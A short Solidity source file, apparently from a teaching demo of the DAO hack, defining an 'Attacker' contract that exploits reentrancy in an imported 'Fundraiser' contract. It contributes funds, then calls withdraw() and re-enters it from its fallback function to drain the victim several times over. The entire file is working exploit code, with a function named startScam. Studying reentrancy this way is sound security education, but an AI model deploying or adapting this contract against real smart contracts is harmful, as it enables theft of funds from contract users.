pragma solidity ^0.4.8;

//to make this contract be able to hack the other contract, we will just import the file to make it easier.

import "./daoHackFundRaiser.sol";

contract Attacker {
    
    address public fundraiserAddress;
    uint public drainTimes = 0;
    
    function Attacker(address victimAddress) {
        fundraiserAddress = victimAddress;
    }
    
    function() payable {
        if(drainTimes < 3) {
            drainTimes++;
            Fundraiser(fundraiserAddress).withdraw();
        
            }
        }
    
    function getFunds() returns (uint) {
        return address(this).balance;
    }
    
    function payMe() payable {
        Fundraiser(fundraiserAddress).contribute.value(msg.value)();
    }
    
    function startScam() {
        Fundraiser(fundraiserAddress).withdraw();
    }
}